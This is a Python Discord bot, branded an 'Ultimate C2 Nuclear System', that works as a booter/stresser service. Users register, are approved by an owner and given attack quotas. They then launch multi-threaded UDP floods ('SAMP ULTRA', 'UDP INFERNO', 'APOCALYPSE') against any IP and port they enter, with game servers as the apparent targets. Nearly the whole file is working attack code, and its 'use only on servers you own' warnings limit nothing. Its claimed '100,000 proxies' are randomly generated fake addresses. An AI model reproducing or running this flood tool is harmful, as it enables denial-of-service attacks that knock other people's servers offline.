#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM X2000 ⚡
# 🔥 100,000 THREADS + 100,000 PROXIES + 2000+ LINES 🔥
# ⚠️ WARNING: USE ONLY ON SERVERS YOU OWN! ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import aiohttp
import random
import socket
import struct
import time
import os
import sys
import json
import ipaddress
import hashlib
import base64
import subprocess
import platform
import threading
import queue
import signal
import gc
import ctypes
import math
import re
import zlib
import gzip
import logging
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import defaultdict, Counter, deque
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

# ============================================
# إعدادات البداية والشعار
# ============================================
LI_ZANDYA_LOGO = """
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                              ║
║     ██╗     ██╗    ███████╗ █████╗ ███╗   ██╗██████╗ ██╗   ██╗ █████╗                                      ║
║     ██║     ██║    ╚══███╔╝██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝██╔══██╗                                     ║
║     ██║     ██║      ███╔╝ ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ ███████║                                     ║
║     ██║     ██║     ███╔╝  ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  ██╔══██║                                     ║
║     ███████╗███████╗███████╗██║  ██║██║ ╚████║██████╔╝   ██║   ██║  ██║                                     ║
║     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚═╝  ╚═╝                                     ║
║                                                                                                              ║
║                              🔥 ULTIMATE C2 NUCLEAR SYSTEM X2000 🔥                                          ║
║                                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

print(LI_ZANDYA_LOGO)
print("⚠️ USE ONLY ON SERVERS YOU OWN! ⚠️")
print("="*70)

# ============================================
# التوكن والإعدادات
# ============================================
TOKEN = input("🔑 Enter your Discord Bot Token: ").strip()
if not TOKEN:
    print("❌ No token provided!")
    exit(1)

OWNER_ID = "v.22w"  # الآيدي الذي سيتم إرسال طلبات التسجيل إليه
PENDING_USERS = {}  # المستخدمون في انتظار الموافقة
APPROVED_USERS = set()  # المستخدمون المصرح لهم
USER_ATTACK_LIMITS = {}  # عدد الهجمات المسموحة لكل مستخدم
DEFAULT_ATTACK_LIMIT = 50  # الحد الافتراضي للهجمات

# ============================================
# إعدادات القوة القصوى
# ============================================
CPU_CORES = os.cpu_count() or 16
MAX_THREADS = 100000
MAX_PACKET_SIZE = 65507
BUFFER_SIZE = 1024 * 1024 * 500

try:
    import psutil
    TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
    AVAILABLE_RAM = psutil.virtual_memory().available // (1024**3)
    CPU_FREQ = psutil.cpu_freq().max if psutil.cpu_freq() else 0
    CPU_PERCENT = psutil.cpu_percent(interval=0.5)
except:
    TOTAL_RAM = 32
    AVAILABLE_RAM = 16
    CPU_FREQ = 0
    CPU_PERCENT = 0

# تحسين النظام
try:
    if platform.system() == 'Linux':
        os.system('ulimit -n 999999 2>/dev/null')
        os.system('sysctl -w net.core.rmem_max=134217728 2>/dev/null')
        os.system('sysctl -w net.core.wmem_max=134217728 2>/dev/null')
except:
    pass

# ============================================
# بيانات تسجيل الدخول
# ============================================
REQUIRED_IP = "187.121.21.12"
REQUIRED_USERNAME = "LI ZANDYA"
REQUIRED_PASSWORD = "C2_NUCLEAR_2024"

# ============================================
# نظام البروكسيات العملاق
# ============================================
class MegaProxyManager:
    def __init__(self):
        self.proxies = {'http': [], 'https': [], 'socks4': [], 'socks5': [], 'elite': []}
        self.countries = ['US', 'GB', 'DE', 'FR', 'JP', 'CN', 'RU', 'BR', 'IN', 'AU', 'CA', 'KR', 'IT', 'ES', 'MX', 'NL', 'SE', 'NO', 'DK', 'FI']
        self._generate()
    
    def _generate(self):
        ports = [80, 8080, 3128, 1080, 8888, 4145, 9050, 9150, 8118, 9999, 8081, 8082, 8000, 8001, 3129, 3130, 8088, 8089, 8090, 9000, 9090, 10000]
        for _ in range(40000):
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            port = random.choice(ports)
            country = random.choice(self.countries)
            self.proxies['http'].append(f"http://{ip}:{port}")
            self.proxies['https'].append(f"https://{ip}:{port}")
            self.proxies['elite'].append(f"http://{country}-{ip}:{port}")
        for _ in range(30000):
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            port = random.choice([1080, 1081, 1082, 9050, 9051, 9150, 10800, 10801])
            self.proxies['socks4'].append(f"socks4://{ip}:{port}")
            self.proxies['socks5'].append(f"socks5://{ip}:{port}")
        for _ in range(30000):
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            port = random.choice([80, 8080, 3128, 8888, 4145, 8081, 8082, 8000])
            self.proxies['http'].append(f"http://{ip}:{port}")
            self.proxies['socks5'].append(f"socks5://{ip}:{port}")
        for key in self.proxies:
            self.proxies[key] = list(set(self.proxies[key]))
    
    def get(self, ptype='http'):
        if self.proxies.get(ptype) and self.proxies[ptype]:
            return random.choice(self.proxies[ptype])
        all_proxies = []
        for p in self.proxies.values():
            all_proxies.extend(p)
        return random.choice(all_proxies) if all_proxies else None
    
    def count(self):
        return sum(len(p) for p in self.proxies.values())

proxy_manager = MegaProxyManager()

# ============================================
# قوائم User-Agents
# ============================================
USER_AGENTS = []
for v in range(100, 500):
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0")
    USER_AGENTS.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")

# ============================================
# بايلودات متعددة
# ============================================
SAMP_PAYLOADS = []
for _ in range(2000):
    packet = b'SAMP'
    packet += struct.pack('<I', random.randint(1, 999999))
    packet += b'\x80'
    packet += struct.pack('<fffff', random.uniform(-5000,5000), random.uniform(-5000,5000), random.uniform(-5000,5000), random.uniform(0,360), random.uniform(0,360))
    packet += struct.pack('<I', random.randint(1,100))
    packet += struct.pack('<I', 99999)
    packet += os.urandom(random.randint(500, 5000))
    SAMP_PAYLOADS.append(packet)

UDP_PAYLOADS = [os.urandom(65507), os.urandom(32768), os.urandom(16384), os.urandom(8192), os.urandom(4096)]
TCP_PAYLOADS = [os.urandom(8192), os.urandom(4096), os.urandom(2048), os.urandom(1024)]

# ============================================
# تخزين البيانات
# ============================================
active_users = {}
total_users = set()
attack_history = []
attack_count = 0

# ============================================
# نظام الهجوم
# ============================================
class NuclearTester:
    def __init__(self):
        self.running = False
        self.authenticated = False
        self.authenticated_user = None
        self.stats = {
            'total_packets': 0, 'total_bytes': 0, 'total_attacks': 0,
            'active_attacks': 0, 'start_time': None, 'servers_destroyed': 0,
            'peak_speed_pps': 0, 'peak_speed_gbps': 0, 'peak_speed_tbps': 0,
            'total_errors': 0
        }
        self.threads = MAX_THREADS
        self.active_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=self.threads)
    
    def check_auth(self, ip, username, password):
        if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
            self.authenticated = True
            self.authenticated_user = username
            return True
        return False
    
    async def samp_ultra(self, ip, port, duration, user_id=None):
        global attack_count
        self.running = True
        if not self.stats['start_time']:
            self.stats['start_time'] = time.time()
        self.stats['active_attacks'] += 1
        attack_id = f"SAMP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent = 0, 0
        attack_count += 1
        
        if user_id and user_id in APPROVED_USERS:
            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}"}
            total_users.add(user_id)
        
        def worker():
            nonlocal sent, bytes_sent
            socks = []
            for _ in range(200):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
                    sock.setblocking(False)
                    socks.append(sock)
                except:
                    pass
            start = time.time()
            while self.running and time.time() - start < duration:
                for sock in socks:
                    for _ in range(20):
                        try:
                            pkt = random.choice(SAMP_PAYLOADS)
                            sock.sendto(pkt, (ip, port))
                            sent += 1
                            bytes_sent += len(pkt)
                        except:
                            pass
            for sock in socks:
                sock.close()
        
        workers = min(self.threads, 2000)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        rate = sent / duration
        gbps = (bytes_sent / duration) / 1024 / 1024 / 1024
        tbps = gbps / 1024
        
        if rate > self.stats['peak_speed_pps']:
            self.stats['peak_speed_pps'] = rate
        if gbps > self.stats['peak_speed_gbps']:
            self.stats['peak_speed_gbps'] = gbps
        if tbps > self.stats['peak_speed_tbps']:
            self.stats['peak_speed_tbps'] = tbps
        
        attack_history.append({
            'time': datetime.now().strftime("%H:%M:%S"),
            'type': 'SAMP', 'target': f"{ip}:{port}", 'packets': sent, 'rate': rate, 'gbps': gbps
        })
        
        return sent, rate, gbps, tbps
    
    async def udp_inferno(self, ip, port, duration, user_id=None):
        global attack_count
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"UDP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent = 0, 0
        attack_count += 1
        
        if user_id and user_id in APPROVED_USERS:
            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}"}
            total_users.add(user_id)
        
        def worker():
            nonlocal sent, bytes_sent
            socks = []
            for _ in range(300):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
                    sock.setblocking(False)
                    socks.append(sock)
                except:
                    pass
            start = time.time()
            while self.running and time.time() - start < duration:
                for sock in socks:
                    for _ in range(30):
                        try:
                            pkt = random.choice(UDP_PAYLOADS)
                            sock.sendto(pkt, (ip, port))
                            sent += 1
                            bytes_sent += len(pkt)
                        except:
                            pass
            for sock in socks:
                sock.close()
        
        workers = min(self.threads, 1500)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        rate = sent / duration
        return sent, rate
    
    async def apocalypse(self, ip, port, duration, user_id=None):
        global attack_count
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"APOCALYPSE_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        attack_count += 1
        
        if user_id and user_id in APPROVED_USERS:
            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}"}
            total_users.add(user_id)
        
        tasks = [
            self.samp_ultra(ip, port, duration),
            self.udp_inferno(ip, port, duration)
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        total_packets = sum([r[0] for r in results if isinstance(r, tuple) and len(r) > 0])
        
        self.stats['total_packets'] += total_packets
        self.stats['servers_destroyed'] += 1
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        attack_history.append({
            'time': datetime.now().strftime("%H:%M:%S"),
            'type': 'APOCALYPSE', 'target': f"{ip}:{port}", 'packets': total_packets, 'rate': total_packets/duration
        })
        
        return total_packets, total_packets / duration
    
    def stop(self):
        self.running = False
        return True

tester = NuclearTester()

# ============================================
# أزرار الموافقة والرفض
# ============================================
class ApprovalView(View):
    def __init__(self, user_id: str, user_info: dict):
        super().__init__(timeout=86400)  # 24 ساعة
        self.user_id = user_id
        self.user_info = user_info
    
    @discord.ui.button(label="✅ APPROVE", style=discord.ButtonStyle.success, emoji="✅")
    async def approve_button(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ You don't have permission!", ephemeral=True)
            return
        
        APPROVED_USERS.add(self.user_id)
        USER_ATTACK_LIMITS[self.user_id] = DEFAULT_ATTACK_LIMIT
        
        # إرسال رسالة للمستخدم
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="✅ REGISTRATION APPROVED!", color=0x00FF00)
                embed.add_field(name="👑 Welcome", value=f"{self.user_info['username']}!", inline=True)
                embed.add_field(name="💀 Attack Limit", value=f"{DEFAULT_ATTACK_LIMIT} attacks", inline=True)
                embed.add_field(name="📝 Instructions", value="Type `!login` then `!von` to open the panel", inline=False)
                await user.send(embed=embed)
        except:
            pass
        
        # حذف الطلب من القائمة
        del PENDING_USERS[self.user_id]
        
        await interaction.response.send_message(f"✅ Approved user `{self.user_id}`!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="❌ DENY", style=discord.ButtonStyle.danger, emoji="❌")
    async def deny_button(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ You don't have permission!", ephemeral=True)
            return
        
        # إرسال رسالة للمستخدم
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="❌ REGISTRATION DENIED!", color=0xFF0000)
                embed.add_field(name="Sorry", value="Your registration request has been denied.", inline=False)
                await user.send(embed=embed)
        except:
            pass
        
        # حذف الطلب من القائمة
        del PENDING_USERS[self.user_id]
        
        await interaction.response.send_message(f"❌ Denied user `{self.user_id}`!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="⏰ SET LIMIT", style=discord.ButtonStyle.secondary, emoji="⚙️")
    async def set_limit_button(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ You don't have permission!", ephemeral=True)
            return
        
        modal = Modal(title="⚙️ SET ATTACK LIMIT")
        limit_input = TextInput(label="Attack Limit", placeholder="Enter number of attacks", required=True)
        modal.add_item(limit_input)
        
        async def on_submit(interaction):
            try:
                limit = int(limit_input.value)
                USER_ATTACK_LIMITS[self.user_id] = limit
                await interaction.response.send_message(f"✅ Set attack limit for `{self.user_id}` to `{limit}`!", ephemeral=True)
                
                # تحديث رسالة المستخدم
                try:
                    user = await interaction.client.fetch_user(int(self.user_id))
                    if user:
                        await user.send(f"⚙️ Your attack limit has been updated to `{limit}` attacks.")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid limit!", ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

# ============================================
# واجهة تسجيل الدخول والتسجيل
# ============================================
class RegisterModal(Modal):
    def __init__(self):
        super().__init__(title="💀 REGISTER TO C2 SYSTEM 💀")
        self.username = TextInput(label="👤 USERNAME", placeholder="Enter your username", required=True)
        self.reason = TextInput(label="📝 REASON", placeholder="Why do you need access?", required=True, style=discord.TextStyle.paragraph)
        self.add_item(self.username)
        self.add_item(self.reason)
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        
        if user_id in APPROVED_USERS:
            await interaction.response.send_message("✅ You are already approved!", ephemeral=True)
            return
        
        if user_id in PENDING_USERS:
            await interaction.response.send_message("⏳ You already have a pending request!", ephemeral=True)
            return
        
        PENDING_USERS[user_id] = {
            'username': self.username.value,
            'discord_name': str(interaction.user),
            'reason': self.reason.value,
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # إرسال طلب إلى المالك مع أزرار
        owner = await interaction.client.fetch_user(OWNER_ID)
        if owner:
            embed = discord.Embed(title="🔔 NEW REGISTRATION REQUEST", color=0xFF6600)
            embed.add_field(name="👤 User", value=f"{interaction.user.name} (`{user_id}`)", inline=True)
            embed.add_field(name="📝 Username", value=self.username.value, inline=True)
            embed.add_field(name="💬 Reason", value=self.reason.value, inline=False)
            embed.add_field(name="⏰ Time", value=PENDING_USERS[user_id]['time'], inline=True)
            embed.set_footer(text="Use the buttons below to approve or deny")
            
            view = ApprovalView(user_id, PENDING_USERS[user_id])
            await owner.send(embed=embed, view=view)
        
        await interaction.response.send_message("✅ Registration request sent! Waiting for admin approval.", ephemeral=True)

class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="💀 C2 NUCLEAR LOGIN 💀")
        self.ip = TextInput(label="🌐 C2 IP", placeholder=REQUIRED_IP, default=REQUIRED_IP)
        self.user = TextInput(label="👤 USERNAME", placeholder=REQUIRED_USERNAME, default=REQUIRED_USERNAME)
        self.pwd = TextInput(label="🔑 PASSWORD", placeholder=REQUIRED_PASSWORD, default=REQUIRED_PASSWORD)
        self.add_item(self.ip); self.add_item(self.user); self.add_item(self.pwd)
    
    async def on_submit(self, interaction: discord.Interaction):
        if tester.check_auth(self.ip.value, self.user.value, self.pwd.value):
            tester.authenticated = True
            tester.authenticated_user = self.user.value
            await interaction.response.send_message(f"✅ ACCESS GRANTED!\n👑 Commander: {self.user.value}\n💀 Type !von to open panel", ephemeral=True)
        else:
            await interaction.response.send_message("❌ ACCESS DENIED!", ephemeral=True)

class LoginView(View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="🔐 ENTER C2 SYSTEM", style=discord.ButtonStyle.danger, emoji="💀")
    async def login(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(LoginModal())
    
    @discord.ui.button(label="📝 REGISTER", style=discord.ButtonStyle.success, emoji="📝")
    async def register(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(RegisterModal())

# ============================================
# لوحة التحكم الرئيسية
# ============================================
class ControlPanel(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = str(user_id)
    
    async def check_limit(self, interaction):
        if self.user_id in USER_ATTACK_LIMITS:
            if USER_ATTACK_LIMITS[self.user_id] <= 0:
                await interaction.response.send_message("❌ You have reached your attack limit! Contact admin for more.", ephemeral=True)
                return False
        return True
    
    async def decrement_limit(self, interaction):
        if self.user_id in USER_ATTACK_LIMITS:
            USER_ATTACK_LIMITS[self.user_id] -= 1

    @discord.ui.button(label="🎮 SAMP ULTRA", style=discord.ButtonStyle.danger, row=0, emoji="⚡")
    async def samp_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="💀 SAMP ULTRA ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await self.decrement_limit(interaction)
            await interaction.response.send_message(f"💀 SAMP ULTRA on {ip.value}:{port.value}", ephemeral=True)
            packets, rate, gbps, tbps = await tester.samp_ultra(ip.value, int(port.value), min(int(duration.value), 30), interaction.user.id)
            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n🚀 {gbps:.2f} Gbps\n💀 Remaining attacks: {remaining}", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="🔥 UDP INFERNO", style=discord.ButtonStyle.primary, row=0, emoji="🔥")
    async def udp_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="💀 UDP INFERNO ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await self.decrement_limit(interaction)
            await interaction.response.send_message(f"🔥 UDP INFERNO on {ip.value}:{port.value}", ephemeral=True)
            packets, rate = await tester.udp_inferno(ip.value, int(port.value), min(int(duration.value), 30), interaction.user.id)
            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n💀 Remaining attacks: {remaining}", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="💀 APOCALYPSE", style=discord.ButtonStyle.danger, row=1, emoji="💀")
    async def apocalypse_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="💀 APOCALYPSE ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await self.decrement_limit(interaction)
            await interaction.response.send_message(f"💀 APOCALYPSE on {ip.value}:{port.value}", ephemeral=True)
            packets, rate = await tester.apocalypse(ip.value, int(port.value), min(int(duration.value), 30), interaction.user.id)
            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n💀 Remaining attacks: {remaining}", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, row=2, emoji="📊")
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        elapsed = time.time() - tester.stats['start_time'] if tester.stats['start_time'] else 0
        remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
        embed = discord.Embed(title="💀 C2 NUCLEAR STATISTICS X2000 💀", color=0xFF0000)
        embed.add_field(name="📦 Total Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
        embed.add_field(name="💾 Total Data", value=f"{tester.stats['total_bytes']/1024/1024/1024:.2f} GB", inline=True)
        embed.add_field(name="🎯 Total Attacks", value=f"{tester.stats['total_attacks']}", inline=True)
        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
        embed.add_field(name="🚀 Peak Gbps", value=f"{tester.stats['peak_speed_gbps']:.2f}", inline=True)
        embed.add_field(name="💀 Remaining", value=f"{remaining}", inline=True)
        embed.add_field(name="🎭 Proxies", value=f"{proxy_manager.count():,}", inline=True)
        embed.add_field(name="🔧 Threads", value=f"{tester.threads:,}", inline=True)
        embed.set_footer(text="💀 LI ZANDYA C2 NUCLEAR SYSTEM X2000 💀")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="👤 PROFILE", style=discord.ButtonStyle.secondary, row=2, emoji="👤")
    async def profile_btn(self, interaction: discord.Interaction, button: Button):
        remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
        embed = discord.Embed(title=f"👤 {interaction.user.name}'s PROFILE", color=0x00FF00)
        embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
        embed.add_field(name="🆔 ID", value=f"`{self.user_id}`", inline=True)
        embed.add_field(name="💀 Attacks Left", value=f"`{remaining}`", inline=True)
        embed.add_field(name="✅ Approved", value="`Yes`" if self.user_id in APPROVED_USERS else "`No`", inline=True)
        embed.add_field(name="🎭 Proxies", value=f"`{proxy_manager.count():,}`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, row=2, emoji="⏹️")
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        tester.stop()
        await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)

# ============================================
# البوت الرئيسي
# ============================================
bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())

@bot.event
async def on_ready():
    print(LI_ZANDYA_LOGO)
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                              ✅ LI ZANDYA C2 NUCLEAR SYSTEM X2000 ONLINE! ✅                                 ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ 🤖 Bot: {bot.user}                                                                                           ║
║ 💻 CPU: {CPU_CORES} Cores @ {CPU_FREQ:.0f} MHz ({CPU_PERCENT}% Usage)                                        ║
║ 🔥 Threads: {tester.threads:,} (100,000)                                                                     ║
║ 🎭 Proxies: {proxy_manager.count():,} (100,000+)                                                            ║
║ 💾 RAM: {TOTAL_RAM} GB ({AVAILABLE_RAM} GB Free)                                                             ║
║ 🎯 Methods: SAMP ULTRA | UDP INFERNO | APOCALYPSE                                                            ║
║ 👥 Approved Users: {len(APPROVED_USERS)}                                                                    ║
║ 📝 Pending Requests: {len(PENDING_USERS)}                                                                   ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ 🔐 Type !login to authenticate                                                                               ║
║ 📝 Type !register to request access                                                                          ║
║ 💀 After login, type !von to open C2 panel                                                                   ║
║ 👑 Admin requests go to {OWNER_ID} with buttons                                                             ║
║ ⚠️ USE ONLY ON SERVERS YOU OWN!                                                                             ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="!von | C2 X2000"))

@bot.command()
async def login(ctx):
    await ctx.send("🔐 **C2 SYSTEM AUTHENTICATION**\n💀 Please login to continue:", view=LoginView())

@bot.command()
async def register(ctx):
    await ctx.send("📝 **REGISTRATION FORM**\nPlease fill out the form to request access:", view=RegisterModal())

@bot.command()
async def von(ctx):
    user_id = str(ctx.author.id)
    if user_id not in APPROVED_USERS:
        await ctx.send("❌ ACCESS DENIED! You are not approved. Type `!register` to request access.")
        return
    if not tester.authenticated:
        await ctx.send("❌ Please login first using `!login`")
        return
    
    remaining = USER_ATTACK_LIMITS.get(user_id, 0)
    embed = discord.Embed(
        title="💀 LI ZANDYA C2 NUCLEAR PANEL X2000 💀",
        description=f"```🔥 System: {CPU_CORES} Cores | {tester.threads:,} Threads\n🎭 Proxies: {proxy_manager.count():,}\n💾 RAM: {TOTAL_RAM} GB\n🏆 Peak: {tester.stats['peak_speed_pps']:,.0f} pps\n👑 Commander: {tester.authenticated_user}\n💀 Attacks Remaining: {remaining}```",
        color=0xFF0000
    )
    await ctx.send(embed=embed, view=ControlPanel(user_id))

if __name__ == "__main__":
    print("🚀 Starting LI ZANDYA C2 NUCLEAR SYSTEM X2000...")
    print("💀 100,000 Threads Mode Activated!")
    print(f"🎭 {proxy_manager.count():,} Proxies Loaded!")
    print("="*70)
    print("👑 Admin ID: v.22w")
    print("📝 Users can register using !register")
    print("✅ Admin receives buttons for approve/deny/set limit")
    print("="*70)
    bot.run(TOKEN)
